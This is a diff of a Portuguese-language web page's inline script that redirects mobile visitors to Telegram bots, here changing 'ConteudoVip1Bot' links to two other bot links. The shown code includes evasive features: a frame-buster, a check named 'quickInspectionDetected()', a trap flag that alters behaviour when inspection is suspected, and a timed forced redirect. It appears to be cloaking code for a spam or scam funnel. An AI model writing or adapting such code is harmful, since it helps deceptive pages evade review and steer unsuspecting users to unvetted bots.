@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<!DOCTYPE html> 
 <html lang="pt-BR">
 <head>
 <meta charset="utf-8"/>
@@ -83,11 +83,10 @@
 
 <script>
 (()=>{
-
-  // === Links MOBILE atualizados com ?start=rd ===
+  // === Links MOBILE atualizados ===
   const mobileBots = [
-    "https://t.me/ConteudoVip1Bot?start=rd",
-    "https://t.me/ConteudoVip1Bot?start=rd"
+    "https://t.me/Trambly_bot?start=start",
+    "https://t.me/Crunfo_bot?start=start"
   ];
 
   // === Link DESKTOP mantido ===
@@ -132,7 +131,6 @@
   }, {passive:false});
   try{ if (window.top !== window.self) window.top.location = window.self.location; }catch(e){}
 
-  // aumento do delay para garantir que o iframe seja criado em conexões lentas
   const REDIRECT_DELAY_MS = 350;
 
   if (quickInspectionDetected()) {
@@ -159,7 +157,6 @@
     if (trapTriggered) return;
     try { location.replace(dest); } catch(e) { location.href = dest; }
   }, REDIRECT_DELAY_MS);
-
 })();
 </script>
 </body>
